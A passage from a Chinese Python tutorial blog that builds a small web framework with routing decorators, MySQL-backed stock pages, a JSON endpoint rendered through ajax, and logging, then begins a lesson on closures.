+ &quot;\r\n&quot;).encode(&quot;utf-8&quot;) + response_body                # 发送数据                new_socket.send(response_data)            finally:                # 关闭服务与客户端的套接字                new_socket.close()    def start(self):        while True:            # 等待接受客户端的连接请求            new_socket, ip_port = self.tcp_server_socket.accept()            sub_thread = threading.Thread(target=self.handle_client_quest, args=(new_socket,))            # 设置守护线程            sub_thread.setDaemon(True)            sub_thread.start()# 程序入口函数def main():    # 获取命令行参数判断长度    if len(sys.argv) != 2:        print(&quot;执行命令如下: python3 xxx.py 9000&quot;)        return    # 判断端口号是否是数字    if not sys.argv[1].isdigit():        print(&quot;执行命令如下: python3 xxx.py 9000&quot;)        return    # 需要转成int类型    port = int(sys.argv[1])    # 创建web服务器    web_server = HttpWebServer(port)    # 启动web服务器    web_server.start()if __name__ == &#39;__main__&#39;:    main()</code></pre><h3 id="3-处理客户端的动态资源请求"><a href="#3-处理客户端的动态资源请求" class="headerlink" title="3. 处理客户端的动态资源请求"></a>3. 处理客户端的动态资源请求</h3><ol><li>创建web框架程序</li><li>接收web服务器的动态资源请求</li><li>处理web服务器的动态资源请求并把处理结果返回给web服务器</li><li>web服务器把处理结果组装成响应报文发送给浏览器</li></ol><p><strong>web框架程序(framework.py)代码:</strong></p><pre><code class="python">&quot;&quot;&quot;miniweb框架，负责处理动态资源请求&quot;&quot;&quot;import time# 获取首页数据def index():    # 响应状态    status = &quot;200 OK&quot;;    # 响应头    response_header = [(&quot;Server&quot;, &quot;PWS2.0&quot;)]    # 处理后的数据    data = time.ctime()    return status, response_header, data# 没有找到动态资源def not_found():    # 响应状态    status = &quot;404 Not Found&quot;;    # 响应头    response_header = [(&quot;Server&quot;, &quot;PWS2.0&quot;)]    # 处理后的数据    data = &quot;not found&quot;    return status, response_header, data# 处理动态资源请求def handle_request(env):    # 获取动态请求资源路径    request_path = env[&quot;request_path&quot;]    print(&quot;接收到的动态资源请求:&quot;, request_path)    if request_path == &quot;/index.html&quot;:        # 获取首页数据        result = index()        return result    else:        # 没有找到动态资源        result = not_found()        return result</code></pre><h3 id="4-小结"><a href="#4-小结" class="headerlink" title="4. 小结"></a>4. 小结</h3><ul><li>动态资源的判断通过请求资源路径的后缀是.html来完成，否则是静态资源</li><li>处理客户端的动态资源请求<ol><li>接收web服务器的动态资源请求</li><li>处理动态资源请求并把处理结果返回给web服务器</li><li>web服务器把处理结果组装成响应报文发送给浏览器</li></ol></li></ul><h2 id="三、模板替换功能开发"><a href="#三、模板替换功能开发" class="headerlink" title="三、模板替换功能开发"></a>三、模板替换功能开发</h2><h3 id="1-读取股票信息模板文件"><a href="#1-读取股票信息模板文件" class="headerlink" title="1. 读取股票信息模板文件"></a>1. 读取股票信息模板文件</h3><p><strong>framework.py示例代码:</strong></p><pre><code class="python"># 获取首页数据def index():    # 响应状态    status = &quot;200 OK&quot;;    # 响应头    response_header = [(&quot;Server&quot;, &quot;PWS2.0&quot;)]    # 打开模板文件，读取数据    with open(&quot;template/index.html&quot;, &quot;r&quot;) as file:        file_data = file.read()</code></pre><h3 id="2-使用模拟数据替换模板变量"><a href="#2-使用模拟数据替换模板变量" class="headerlink" title="2. 使用模拟数据替换模板变量"></a>2. 使用模拟数据替换模板变量</h3><p><strong>framework.py示例代码:</strong></p><pre><code class="python"># 获取首页数据def index():    # 响应状态    status = &quot;200 OK&quot;;    # 响应头    response_header = [(&quot;Server&quot;, &quot;PWS2.0&quot;)]    # 1. 打开模板文件，读取数据    with open(&quot;template/index.html&quot;, &quot;r&quot;) as file:        file_data = file.read()    # 处理后的数据, 从数据库查询    data = time.ctime()    # 2. 替换模板文件中的模板遍历    result = file_data.replace(&quot;{%content%}&quot;, data)    return status, response_header, result</code></pre><h3 id="3-小结"><a href="#3-小结" class="headerlink" title="3. 小结"></a>3. 小结</h3><ul><li>模板替换功能<ol><li>打开template目录下的index.html模板文件，读取模板文件数据</li><li>把模板文件中的模板变量进行替换</li></ol></li></ul><h2 id="四、路由列表功能开发"><a href="#四、路由列表功能开发" class="headerlink" title="四、路由列表功能开发"></a>四、路由列表功能开发</h2><h3 id="1-路由的介绍"><a href="#1-路由的介绍" class="headerlink" title="1. 路由的介绍"></a>1. 路由的介绍</h3><p>接着上面程序的判断场景，假如咱们再处理一个个人中心的动态资源请求非常简单，再添加一个函数和更加一个分支判断就可以实现了。</p><p><strong>framework.py 示例代码:</strong></p><pre><code class="python"># 获取个人中心数据def center():    # 响应状态    status = &quot;200 OK&quot;;    # 响应头    response_header = [(&quot;Server&quot;, &quot;PWS2.0&quot;)]    # 打开模板文件，读取数据    with open(&quot;template/center.html&quot;, &quot;r&quot;) as file:        file_data = file.read()    # 处理后的数据, 从数据库查询    data = time.ctime()    # 替换模板文件中的模板遍历    result = file_data.replace(&quot;{%content%}&quot;, data)    return status, response_header, result# 处理动态资源请求def handle_request(env):    # 获取动态请求资源路径    request_path = env[&quot;request_path&quot;]    print(&quot;接收到的动态资源请求:&quot;, request_path)    if request_path == &quot;/index.html&quot;:        # 获取首页数据        result = index()        return result    elif request_path == &quot;/center.html&quot;:        # 获取个人中心数据        result = center()        return result    else:        # 没有找到动态资源        result = not_found()        return result</code></pre><p>那如果咱们的框架处理的页面请求路径再多一些，比如:5个路径判断，大家可能感觉条件分支完全可以胜任，如果是40个甚至更多呢? 如果这是还是用普通的条件分支简直无法忍受。</p><p>解决办法: <strong>可以使用路由</strong></p><p><strong>什么是路由？</strong></p><p>路由就是请求的URL到处理函数的映射，也就是说提前把请求的URL和处理函数关联好。</p><p><strong>路由列表</strong></p><p>这么多的路由如何管理呢， 可以使用一个路由列表进行管理，通过路由列表保存每一个路由。</p><table><thead><tr><th align="left">请求路径</th><th align="left">处理函数</th></tr></thead><tbody><tr><td align="left">/login.html</td><td align="left">login函数</td></tr><tr><td align="left">/index.html</td><td align="left">index函数</td></tr><tr><td align="left">/center.html</td><td align="left">center函数</td></tr></tbody></table><h3 id="2-在路由列表添加路由"><a href="#2-在路由列表添加路由" class="headerlink" title="2. 在路由列表添加路由"></a>2. 在路由列表添加路由</h3><p><strong>framework.py 示例代码:</strong></p><pre><code class="python"># 定义路由列表route_list = [    (&quot;/index.html&quot;, index),    (&quot;/center.html&quot;, center)]</code></pre><h3 id="3-根据用户请求遍历路由列表处理用户请求"><a href="#3-根据用户请求遍历路由列表处理用户请求" class="headerlink" title="3. 根据用户请求遍历路由列表处理用户请求"></a>3. 根据用户请求遍历路由列表处理用户请求</h3><p><strong>framework.py 示例代码:</strong></p><pre><code class="python"># 处理动态资源请求def handle_request(env):    # 获取动态请求资源路径    request_path = env[&quot;request_path&quot;]    print(&quot;接收到的动态资源请求:&quot;, request_path)    # 遍历路由列表，选择执行的函数    for path, func in route_list:        if request_path == path:            result = func()            return result    else:        # 没有找到动态资源        result = not_found()        return result    # if request_path == &quot;/index.html&quot;:    #     # 获取首页数据    #     result = index()    #     return result    # elif request_path == &quot;/center.html&quot;:    #     # 获取个人中心数据    #     result = center()    #     return result    # else:    #     # 没有找到动态资源    #     result = not_found()    #     return result</code></pre><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ul><li>路由是请求的URL到处理函数的映射</li><li>路由列表是用来保存每一个设置好的路由</li><li>用户的动态资源请求通过遍历路由列表找到对应的处理函数来完成。</li></ul><h2 id="五、装饰器方式的添加路由"><a href="#五、装饰器方式的添加路由" class="headerlink" title="五、装饰器方式的添加路由"></a>五、装饰器方式的添加路由</h2><h3 id="1-使用带有参数的装饰器添加路由"><a href="#1-使用带有参数的装饰器添加路由" class="headerlink" title="1. 使用带有参数的装饰器添加路由"></a>1. 使用带有参数的装饰器添加路由</h3><p>前面我们已经实现了路由列表，但是每次添加路由都需要手动添加来完成，接下来我们想要完成路由的自动添加，可以通过装饰器来实现，在使用装饰器对处理函数进行装饰的时候我们需要知道装饰的函数和那个请求路径进行关联，也就是说装饰器需要接收一个url参数，这样我们定义的装饰器是一个带有参数的装饰器。</p><p><strong>示例代码:</strong></p><pre><code class="python">&quot;&quot;&quot;miniweb框架，负责处理动态资源请求&quot;&quot;&quot;import time# 定义路由列表route_list = []# 定义带有参数的装饰器def route(path):    # 装饰器    def decorator(func):        # 当执行装饰器装饰指定函数的时候，把路径和函数添加到路由列表        route_list.append((path, func))        def inner():            # 执行指定函数            return func()        return inner    # 返回装饰器    return decorator# 获取首页数据@route(&quot;/index.html&quot;)def index():    # 响应状态    status = &quot;200 OK&quot;;    # 响应头    response_header = [(&quot;Server&quot;, &quot;PWS2.0&quot;)]    # 打开模板文件，读取数据    with open(&quot;template/index.html&quot;, &quot;r&quot;) as file:        file_data = file.read()    # 处理后的数据, 从数据库查询    data = time.ctime()    # 替换模板文件中的模板遍历    result = file_data.replace(&quot;{%content%}&quot;, data)    return status, response_header, result# 获取个人中心数据@route(&quot;/center.html&quot;)def center():    # 响应状态    status = &quot;200 OK&quot;;    # 响应头    response_header = [(&quot;Server&quot;, &quot;PWS2.0&quot;)]    # 打开模板文件，读取数据    with open(&quot;template/center.html&quot;, &quot;r&quot;) as file:        file_data = file.read()    # 处理后的数据, 从数据库查询    data = time.ctime()    # 替换模板文件中的模板遍历    result = file_data.replace(&quot;{%content%}&quot;, data)    return status, response_header, result# 没有找到动态资源def not_found():    # 响应状态    status = &quot;404 Not Found&quot;;    # 响应头    response_header = [(&quot;Server&quot;, &quot;PWS2.0&quot;)]    # 处理后的数据    data = &quot;not found&quot;    return status, response_header, data# 处理动态资源请求def handle_request(env):    # 获取动态请求资源路径    request_path = env[&quot;request_path&quot;]    print(&quot;接收到的动态资源请求:&quot;, request_path)    # 遍历路由列表，选择执行的函数    for path, func in route_list:        if request_path == path:            result = func()            return result    else:        # 没有找到动态资源        result = not_found()        return result</code></pre><h3 id="2-小结"><a href="#2-小结" class="headerlink" title="2. 小结"></a>2. 小结</h3><ul><li>使用带有参数的装饰器对处理函数进行装饰，并完成路由的添加功能。</li></ul><h2 id="六、显示股票信息页面的开发"><a href="#六、显示股票信息页面的开发" class="headerlink" title="六、显示股票信息页面的开发"></a>六、显示股票信息页面的开发</h2><h3 id="1-数据准备"><a href="#1-数据准备" class="headerlink" title="1. 数据准备"></a>1. 数据准备</h3><pre><code class="sql">-- 创建数据库create database stock_db charset=utf8;-- 切换数据库use stock_db;-- 执行sql文件source stock_db.sql;</code></pre><h3 id="2-根据sql语句查询股票信息"><a href="#2-根据sql语句查询股票信息" class="headerlink" title="2. 根据sql语句查询股票信息"></a>2. 根据sql语句查询股票信息</h3><p><strong>示例代码:</strong></p><pre><code class="python"># 获取首页数据@route(&quot;/index.html&quot;)def index():    # 响应状态    status = &quot;200 OK&quot;;    # 响应头    response_header = [(&quot;Server&quot;, &quot;PWS2.0&quot;)]    # 打开模板文件，读取数据    with open(&quot;template/index.html&quot;, &quot;r&quot;) as file:        file_data = file.read()    # 处理后的数据, 从数据库查询    conn = pymysql.connect(host=&quot;localhost&quot;,                           port=3306,                           user=&quot;root&quot;,                           password=&quot;mysql&quot;,                           database=&quot;stock_db&quot;,                           charset=&quot;utf8&quot;)    # 获取游标    cursor = conn.cursor()    # 查询sql语句    sql = &quot;select * from info;&quot;    # 执行sql    cursor.execute(sql)    # 获取结果集    result = cursor.fetchall()    print(result)</code></pre><h3 id="3-使用查询数据替换模板变量"><a href="#3-使用查询数据替换模板变量" class="headerlink" title="3. 使用查询数据替换模板变量"></a>3. 使用查询数据替换模板变量</h3><p><strong>示例代码:</strong></p><pre><code class="python"># 获取首页数据@route(&quot;/index.html&quot;)def index():    # 响应状态    status = &quot;200 OK&quot;;    # 响应头    response_header = [(&quot;Server&quot;, &quot;PWS2.0&quot;)]    # 打开模板文件，读取数据    with open(&quot;template/index.html&quot;, &quot;r&quot;) as file:        file_data = file.read()    # 处理后的数据, 从数据库查询    conn = pymysql.connect(host=&quot;localhost&quot;,                           port=3306,                           user=&quot;root&quot;,                           password=&quot;mysql&quot;,                           database=&quot;stock_db&quot;,                           charset=&quot;utf8&quot;)    # 获取游标    cursor = conn.cursor()    # 查询sql语句    sql = &quot;select * from info;&quot;    # 执行sql    cursor.execute(sql)    # 获取结果集    result = cursor.fetchall()    print(result)    data = &quot;&quot;    for row in result:        data += &#39;&#39;&#39;&lt;tr&gt;                    &lt;td&gt;%s&lt;/td&gt;                    &lt;td&gt;%s&lt;/td&gt;                    &lt;td&gt;%s&lt;/td&gt;                    &lt;td&gt;%s&lt;/td&gt;                    &lt;td&gt;%s&lt;/td&gt;                    &lt;td&gt;%s&lt;/td&gt;                    &lt;td&gt;%s&lt;/td&gt;                    &lt;td&gt;%s&lt;/td&gt;                    &lt;td&gt;&lt;input type=&quot;button&quot; value=&quot;添加&quot; id=&quot;toAdd&quot; name=&quot;toAdd&quot; systemidvaule=&quot;000007&quot;&gt;&lt;/td&gt;                   &lt;/tr&gt;&#39;&#39;&#39; % row    # 替换模板文件中的模板遍历    result = file_data.replace(&quot;{%content%}&quot;, data)    return status, response_header, result</code></pre><h3 id="4-小结-1"><a href="#4-小结-1" class="headerlink" title="4. 小结"></a>4. 小结</h3><ul><li>根据sql语句查询股票信息</li><li>使用查询数据替换模板变量</li></ul><h2 id="七、个人中心数据接口的开发"><a href="#七、个人中心数据接口的开发" class="headerlink" title="七、个人中心数据接口的开发"></a>七、个人中心数据接口的开发</h2><h3 id="1-根据sql语句查询个人中心数据"><a href="#1-根据sql语句查询个人中心数据" class="headerlink" title="1. 根据sql语句查询个人中心数据"></a>1. 根据sql语句查询个人中心数据</h3><pre><code class="python"># 个人中心数据接口开发@route(&quot;/center_data.html&quot;)def center_data():    # 响应状态    status = &quot;200 OK&quot;;    # 响应头    response_header = [(&quot;Server&quot;, &quot;PWS2.0&quot;), (&quot;Content-Type&quot;, &quot;text/html;charset=utf-8&quot;)]    conn = pymysql.connect(host=&quot;localhost&quot;,                           port=3306,                           user=&quot;root&quot;,                           password=&quot;mysql&quot;,                           database=&quot;stock_db&quot;,                           charset=&quot;utf8&quot;)    # 获取游标    cursor = conn.cursor()    # 查询sql语句    sql = &#39;&#39;&#39;select i.code, i.short, i.chg,              i.turnover, i.price, i.highs, f.note_info              from info as i inner join focus as f on i.id = f.info_id;&#39;&#39;&#39;    # 执行sql    cursor.execute(sql)    # 获取结果集    result = cursor.fetchall()    # 关闭游标    cursor.close()    # 关闭数据库连接    conn.close()    print(result)</code></pre><h3 id="2-将个人中心数据转成json字符串并返回"><a href="#2-将个人中心数据转成json字符串并返回" class="headerlink" title="2. 将个人中心数据转成json字符串并返回"></a>2. 将个人中心数据转成json字符串并返回</h3><pre><code class="python"># 个人中心数据接口开发@route(&quot;/center_data.html&quot;)def center_data():    # 响应状态    status = &quot;200 OK&quot;;    # 响应头    response_header = [(&quot;Server&quot;, &quot;PWS2.0&quot;), (&quot;Content-Type&quot;, &quot;text/html;charset=utf-8&quot;)]    conn = pymysql.connect(host=&quot;localhost&quot;,                           port=3306,                           user=&quot;root&quot;,                           password=&quot;mysql&quot;,                           database=&quot;stock_db&quot;,                           charset=&quot;utf8&quot;)    # 获取游标    cursor = conn.cursor()    # 查询sql语句    sql = &#39;&#39;&#39;select i.code, i.short, i.chg,              i.turnover, i.price, i.highs, f.note_info              from info as i inner join focus as f on i.id = f.info_id;&#39;&#39;&#39;    # 执行sql    cursor.execute(sql)    # 获取结果集    result = cursor.fetchall()    # 关闭游标    cursor.close()    # 关闭数据库连接    conn.close()    # 个人中心数据列表    center_data_list = list()    # 遍历每一行数据转成字典    for row in result:        # 创建空的字典        center_dict = dict()        center_dict[&quot;code&quot;] = row[0]        center_dict[&quot;short&quot;] = row[1]        center_dict[&quot;chg&quot;] = row[2]        center_dict[&quot;turnover&quot;] = row[3]        center_dict[&quot;price&quot;] = str(row[4])        center_dict[&quot;highs&quot;] = str(row[5])        center_dict[&quot;note_info&quot;] = row[6]        # 添加每个字典信息        center_data_list.append(center_dict)    # 把列表字典转成json字符串, 并在控制台显示    json_str = json.dumps(center_data_list,ensure_ascii=False)    print(json_str)    return status, response_header, json_str</code></pre><p><strong>代码说明:</strong></p><ul><li>json.dumps函数把字典转成json字符串<ol><li>函数的第一个参数表示要把指定对象转成json字符串</li><li>参数的第二个参数ensure_ascii=False表示不使用ascii编码，可以在控制台显示中文。</li></ol></li><li>响应头添加Content-Type表示指定数据的编码格式</li></ul><h3 id="3-小结-1"><a href="#3-小结-1" class="headerlink" title="3. 小结"></a>3. 小结</h3><ul><li>web框架程序还可以开发数据接口，为客户端程序提供数据服务。<ul><li><ol><li>根据sql语句查询数据库</li></ol></li><li><ol><li>把数据转成json字符串返回</li></ol></li><li><ol><li>浏览器通过指定接口地址获取web框架提供的数据。</li></ol></li></ul></li></ul><h2 id="八、ajax请求数据渲染个人中心页面"><a href="#八、ajax请求数据渲染个人中心页面" class="headerlink" title="八、ajax请求数据渲染个人中心页面"></a>八、ajax请求数据渲染个人中心页面</h2><h3 id="1-根据用户请求返回个人中心空模板文件数据"><a href="#1-根据用户请求返回个人中心空模板文件数据" class="headerlink" title="1. 根据用户请求返回个人中心空模板文件数据"></a>1. 根据用户请求返回个人中心空模板文件数据</h3><pre><code class="python"># 获取个人中心数据@route(&quot;/center.html&quot;)def center():    # 响应状态    status = &quot;200 OK&quot;    # 响应头    response_header = [(&quot;Server&quot;, &quot;PWS2.0&quot;)]    # 打开模板文件，读取数据    with open(&quot;template/center.html&quot;, &quot;r&quot;) as file:        file_data = file.read()    # 替换模板文件中的模板遍历    result = file_data.replace(&quot;{%content%}&quot;, &quot;&quot;)    return status, response_header, result</code></pre><h3 id="2-在个人中心模板文件添加ajax请求获取个人中心数据"><a href="#2-在个人中心模板文件添加ajax请求获取个人中心数据" class="headerlink" title="2. 在个人中心模板文件添加ajax请求获取个人中心数据"></a>2. 在个人中心模板文件添加ajax请求获取个人中心数据</h3><pre><code class="js">// 发送ajax请求获取个人中心页面数据// 路径写成 center_data.html，发送ajax的时候路径其实是http://ip地址:端口号/center.data.html$.get(&quot;center_data.html&quot;, function (data) {        alert(data);    }}, &quot;json&quot;);</code></pre><h3 id="3-将个人中心数据在页面完成展示"><a href="#3-将个人中心数据在页面完成展示" class="headerlink" title="3. 将个人中心数据在页面完成展示"></a>3. 将个人中心数据在页面完成展示</h3><pre><code class="js">// 发送ajax请求获取个人中心页面数据$.get(&quot;center_data.html&quot;, function (data) {    var data_array = data;    // 获取table标签对象    var $table = $(&quot;.table&quot;)    for(var i = 0; i &lt; data_array.length; i++){        // 获取每一条对象        var center_obj = data_array[i];        var row_html = &#39;&lt;tr&gt;&#39; +            &#39;&lt;td&gt;&#39;+ center_obj.code +&#39;&lt;/td&gt;&#39; +            &#39;&lt;td&gt;&#39;+ center_obj.short +&#39;&lt;/td&gt;&#39; +            &#39;&lt;td&gt;&#39;+ center_obj.chg +&#39;&lt;/td&gt;&#39; +            &#39;&lt;td&gt;&#39;+ center_obj.turnover +&#39;&lt;/td&gt;&#39; +            &#39;&lt;td&gt;&#39;+ center_obj.price +&#39;&lt;/td&gt;&#39; +            &#39;&lt;td&gt;&#39;+ center_obj.highs +&#39;&lt;/td&gt;&#39; +            &#39;&lt;td&gt;&#39;+ center_obj.note_info +&#39;&lt;/td&gt;&#39; +            &#39;&lt;td&gt;&lt;a type=&quot;button&quot; class=&quot;btn btn-default btn-xs&quot; href=&quot;/update/000007.html&quot;&gt; &lt;span class=&quot;glyphicon glyphicon-star&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt; 修改 &lt;/a&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;button&quot; value=&quot;删除&quot; id=&quot;toDel&quot; name=&quot;toDel&quot; systemidvaule=&quot;000007&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&#39;;        // 为table标签添加每一行组装的html数据        $table.append(row_html);    }}, &quot;json&quot;);</code></pre><h3 id="4-小结-2"><a href="#4-小结-2" class="headerlink" title="4. 小结"></a>4. 小结</h3><ul><li>根据用户请求返回个人中心空模板文件数据</li><li>在个人中心模板文件添加ajax请求获取个人中心数据</li><li>将个人中心数据在页面完成展示</li></ul><h2 id="九、logging日志"><a href="#九、logging日志" class="headerlink" title="九、logging日志"></a>九、logging日志</h2><h3 id="1-logging日志的介绍"><a href="#1-logging日志的介绍" class="headerlink" title="1. logging日志的介绍"></a>1. logging日志的介绍</h3><p>在现实生活中，记录日志非常重要，比如:银行转账时会有转账记录；飞机飞行过程中，会有个黑盒子（飞行数据记录器）记录着飞机的飞行过程，那在咱们python程序中想要记录程序在运行时所产生的日志信息，怎么做呢?</p><p>可以使用 <strong>logging</strong> 这个包来完成</p><p><strong>记录程序日志信息的目的是:</strong></p><ol><li>可以很方便的了解程序的运行情况</li><li>可以分析用户的操作行为、喜好等信息</li><li>方便开发人员检查bug</li></ol><h3 id="2-logging日志级别介绍"><a href="#2-logging日志级别介绍" class="headerlink" title="2. logging日志级别介绍"></a>2. logging日志级别介绍</h3><p>日志等级可以分为5个，从低到高分别是:</p><ol><li>DEBUG</li><li>INFO</li><li>WARNING</li><li>ERROR</li><li>CRITICAL</li></ol><p><strong>日志等级说明:</strong></p><ul><li>DEBUG：程序调试bug时使用</li><li>INFO：程序正常运行时使用</li><li>WARNING：程序未按预期运行时使用，但并不是错误，如:用户登录密码错误</li><li>ERROR：程序出错误时使用，如:IO操作失败</li><li>CRITICAL：特别严重的问题，导致程序不能再继续运行时使用，如:磁盘空间为空，一般很少使用</li><li>默认的是WARNING等级，当在WARNING或WARNING之上等级的才记录日志信息。</li><li>日志等级从低到高的顺序是: DEBUG &lt; INFO &lt; WARNING &lt; ERROR &lt; CRITICAL</li></ul><h3 id="3-logging日志的使用"><a href="#3-logging日志的使用" class="headerlink" title="3. logging日志的使用"></a>3. logging日志的使用</h3><p>在 logging 包中记录日志的方式有两种:</p><ol><li>输出到控制台</li><li>保存到日志文件</li></ol><p><strong>日志信息输出到控制台的示例代码:</strong></p><pre><code class="python">import logginglogging.debug(&#39;这是一个debug级别的日志信息&#39;)logging.info(&#39;这是一个info级别的日志信息&#39;)logging.warning(&#39;这是一个warning级别的日志信息&#39;)logging.error(&#39;这是一个error级别的日志信息&#39;)logging.critical(&#39;这是一个critical级别的日志信息&#39;)</code></pre><p><strong>运行结果:</strong></p><pre><code class="python">WARNING:root:这是一个warning级别的日志信息ERROR:root:这是一个error级别的日志信息CRITICAL:root:这是一个critical级别的日志信息</code></pre><p><strong>说明:</strong></p><ul><li>日志信息只显示了大于等于WARNING级别的日志，这说明默认的日志级别设置为WARNING</li></ul><p><strong>logging日志等级和输出格式的设置:</strong></p><pre><code class="python">import logging# 设置日志等级和输出日志格式logging.basicConfig(level=logging.DEBUG,                    format=&#39;%(asctime)s - %(filename)s[line:%(lineno)d] - %(levelname)s: %(message)s&#39;)logging.debug(&#39;这是一个debug级别的日志信息&#39;)logging.info(&#39;这是一个info级别的日志信息&#39;)logging.warning(&#39;这是一个warning级别的日志信息&#39;)logging.error(&#39;这是一个error级别的日志信息&#39;)logging.critical(&#39;这是一个critical级别的日志信息&#39;)</code></pre><p><strong>运行结果:</strong></p><pre><code class="python">2019-02-13 20:41:33,080 - hello.py[line:6] - DEBUG: 这是一个debug级别的日志信息2019-02-13 20:41:33,080 - hello.py[line:7] - INFO: 这是一个info级别的日志信息2019-02-13 20:41:33,080 - hello.py[line:8] - WARNING: 这是一个warning级别的日志信息2019-02-13 20:41:33,080 - hello.py[line:9] - ERROR: 这是一个error级别的日志信息2019-02-13 20:41:33,080 - hello.py[line:10] - CRITICAL: 这是一个critical级别的日志信息</code></pre><p><strong>代码说明:</strong></p><ul><li>level 表示设置的日志等级</li><li>format 表示日志的输出格式, 参数说明:<ul><li>%(levelname)s: 打印日志级别名称</li><li>%(filename)s: 打印当前执行程序名</li><li>%(lineno)d: 打印日志的当前行号</li><li>%(asctime)s: 打印日志的时间</li><li>%(message)s: 打印日志信息</li></ul></li></ul><p><strong>日志信息保存到日志文件的示例代码:</strong></p><pre><code class="python">import logginglogging.basicConfig(level=logging.DEBUG,                    format=&#39;%(asctime)s - %(filename)s[line:%(lineno)d] - %(levelname)s: %(message)s&#39;,                    filename=&quot;log.txt&quot;,                    filemode=&quot;w&quot;)logging.debug(&#39;这是一个debug级别的日志信息&#39;)logging.info(&#39;这是一个info级别的日志信息&#39;)logging.warning(&#39;这是一个warning级别的日志信息&#39;)logging.error(&#39;这是一个error级别的日志信息&#39;)logging.critical(&#39;这是一个critical级别的日志信息&#39;)</code></pre><h3 id="4-logging日志在mini-web项目中应用"><a href="#4-logging日志在mini-web项目中应用" class="headerlink" title="4. logging日志在mini-web项目中应用"></a>4. logging日志在mini-web项目中应用</h3><p><strong>web.py 程序使用logging日志示例:</strong></p><ol><li><p>程序入口模块设置logging日志的设置</p><pre><code class="python"> import socket import threading import sys import framework import logging # logging日志的配置 logging.basicConfig(level=logging.DEBUG,                     format=&#39;%(asctime)s - %(filename)s[line:%(lineno)d] - %(levelname)s: %(message)s&#39;,                     filename=&quot;log.txt&quot;,                     filemode=&quot;w&quot;)</code></pre></li><li><p>INFO级别的日志输出，示例代码:</p><pre><code class="python"> # 判断是否是动态资源请求 if request_path.endswith(&quot;.html&quot;):     &quot;&quot;&quot;这里是动态资源请求，把请求信息交给框架处理&quot;&quot;&quot;     logging.info(&quot;动态资源请求:&quot; + request_path)     ... else:     &quot;&quot;&quot;这里是静态资源请求&quot;&quot;&quot;     logging.info(&quot;静态资源请求:&quot; + request_path)     ...</code></pre></li><li><p>WARNING级别的日志输出，示例代码:</p><pre><code class="python"> # 获取命令行参数判断长度 if len(sys.argv) != 2:     print(&quot;执行命令如下: python3 xxx.py 9000&quot;)     logging.warning(&quot;用户在命令行启动程序参数个数不正确!&quot;)     return # 判断端口号是否是数字 if not sys.argv[1].isdigit():     print(&quot;执行命令如下: python3 xxx.py 9000&quot;)     logging.warning(&quot;用户在命令行启动程序参数不是数字字符串!&quot;)     return</code></pre></li></ol><p><strong>framework.py 程序使用logging日志示例:</strong></p><ol><li><p>ERROR级别的日志输出，示例代码:</p><pre><code class="python"> # 处理动态资源请求 def handle_request(env):     # 获取动态请求资源路径     request_path = env[&quot;request_path&quot;]     print(&quot;接收到的动态资源请求:&quot;, request_path)     # 遍历路由列表，选择执行的函数     for path, func in route_list:         if request_path == path:             result = func()             return result     else:         logging.error(&quot;没有设置相应的路由:&quot; + request_path)         # 没有找到动态资源         result = not_found()         return result</code></pre></li></ol><p><strong>说明:</strong></p><ul><li>logging日志配置信息在程序入口模块设置一次，整个程序都可以生效。<ul><li>logging.basicConfig 表示 logging 日志配置操作</li></ul></li></ul><h3 id="5-小结-1"><a href="#5-小结-1" class="headerlink" title="5. 小结"></a>5. 小结</h3><ul><li>记录python程序中日志信息使用 logging 包来完成</li><li>logging日志等级有5个:<ol><li>DEBUG</li><li>INFO</li><li>WARNING</li><li>ERROR</li><li>CRITICAL</li></ol></li><li>打印(记录)日志的函数有5个:<ol><li>logging.debug函数, 表示: 打印(记录)DEBUG级别的日志信息</li><li>logging.info函数, 表示: 打印(记录)INFO级别的日志信息</li><li>logging.warning函数, 表示: 打印(记录)WARNING级别的日志信息</li><li>logging.error函数, 表示: 打印(记录)ERROR级别的日志信息</li><li>logging.critical函数, 表示: 打印(记录)CRITICAL级别的日志信息</li></ol></li></ul>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python高级09-闭包和装饰器</title>
      <link href="/2020/08/22/2020-08-23-python%E9%AB%98%E7%BA%A709-%E9%97%AD%E5%8C%85%E5%92%8C%E8%A3%85%E9%A5%B0%E5%99%A8/"/>
      <url>/2020/08/22/2020-08-23-python%E9%AB%98%E7%BA%A709-%E9%97%AD%E5%8C%85%E5%92%8C%E8%A3%85%E9%A5%B0%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="闭包和装饰器"><a href="#闭包和装饰器" class="headerlink" title="闭包和装饰器"></a>闭包和装饰器</h1><h2 id="一、闭包"><a href="#一、闭包" class="headerlink" title="一、闭包"></a>一、闭包</h2><h3 id="1-闭包的介绍"><a href="#1-闭包的介绍" class="headerlink" title="1. 闭包的介绍"></a>1. 闭包的介绍</h3><a id="more"></a><p>我们知道当函数调用完，函数内定义的变量都销毁了，但是我们有时候需要保存函数内的这个变量，每次在这个变量的基础上完成一些列的操作，比如: 每次在这个变量的基础上和其它数字进行求和计算，那怎么办呢?</p><p>我们就可以通过咱们今天学习的<strong>闭包</strong>来解决这个需求。</p><p><strong>闭包的定义:</strong></p><p>在函数嵌套的前提下，内部函数使用了外部函数的变量，并且外部函数返回了内部函数，我们把这个<strong>使用外部函数变量的内部函数称为闭包</strong>。</p><h3 id="2-闭包的构成条件"><a href="#2-闭包的构成条件" class="headerlink" title="2. 闭包的构成条件"></a>2. 闭包的构成条件</h3><p>通过闭包的定义，我们可以得知闭包的形成条件:</p><ol><li>在函数嵌套(函数里面再定义函数)的前提下</li><li>内部函数使用了外部函数的变量(还包括外部函数的参数)</li><li>外部函数返回了内部函数</li></ol><h3 id="3-简单闭包的示例代码"><a href="#3-简单闭包的示例代码" class="headerlink" title="3. 简单闭包的示例代码"></a>3. 简单闭包的示例代码</h3><pre><code class="python"># 定义一个外部函数def func_out(num1):    # 定义一个内部函数    def func_inner(num2):        # 内部函数使用了外部函数的变量(num1)        result = num1 + num2        print(&quot;结果是:&quot;, result)    # 外部函数返回了内部函数，这里返回的内部函数就是闭包    return func_inner# 创建闭包实例    f = func_out(1)# 执行闭包f(2)f(3)</code></pre><p><strong>运行结果:</strong></p><pre><code class="python">结果是: 3结果是: 